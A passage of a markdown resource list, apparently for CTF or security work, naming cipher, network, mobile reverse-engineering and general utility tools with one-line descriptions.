- **dcode.fr** - Online cipher tools
- **FactorDB** - Integer factorization database
- **RsaCtfTool** - RSA attack tool

### Network Tools
- **Nmap** - Network scanner
- **Masscan** - High-speed port scanner  
- **Netcat** - Network swiss army knife
- **tcpdump** - Command-line packet analyzer
- **Ettercap** - Network security auditing
- **Aircrack-ng** - WiFi security auditing

### Mobile Security Tools
- **APKTool** - Android APK reverse engineering
- **dex2jar** - Convert Android dex to jar
- **JD-GUI** - Java decompiler
- **MobSF** - Mobile Security Framework
- **Frida** - Dynamic instrumentation toolkit

### General Utilities
- **7zip** - Archive extraction
- **Hex Fiend/HxD** - Hex editors
- **strings** - Extract printable strings
- **file** - Determine file type
- **xxd/hexdump** - Hex dump utilities

--
